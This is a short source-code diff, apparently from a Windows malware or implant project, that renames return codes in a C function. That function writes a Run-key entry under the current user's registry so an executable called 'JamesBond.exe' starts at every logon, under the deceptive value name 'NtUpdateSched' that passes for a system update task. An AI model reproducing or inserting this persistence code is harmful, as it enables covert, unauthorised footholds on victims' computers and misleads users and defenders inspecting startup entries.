@@ -5,7 +5,7 @@
  * Given the path to our JamesBond.exe as well as the argument, generate a new regsitry key under
  * the CURRENT_USER root key, targeting the \run subkey!
  */
-ERR_CODE generateRegKey(char* path, char* arg, LONG access) {
+RET_CODE generateRegKey(char* path, char* arg, LONG access) {
     char exec[128];
     snprintf(exec, 128, "\"%s\" %s", path, arg);
 
@@ -15,7 +15,7 @@ ERR_CODE generateRegKey(char* path, char* arg, LONG access) {
     if (res == ERROR_SUCCESS) {
         res = RegSetValueExA(hKey, "NtUpdateSched", 0, REG_SZ, (LPBYTE) exec, strlen(exec));
         RegCloseKey(hKey);
-        if (res == ERROR_SUCCESS) { return ECODE_SUCCESS; }
+        if (res == ERROR_SUCCESS) { return R_SUCCESS; }
     }
-    return ECODE_FAILURE;
+    return R_FAILURE;
 }
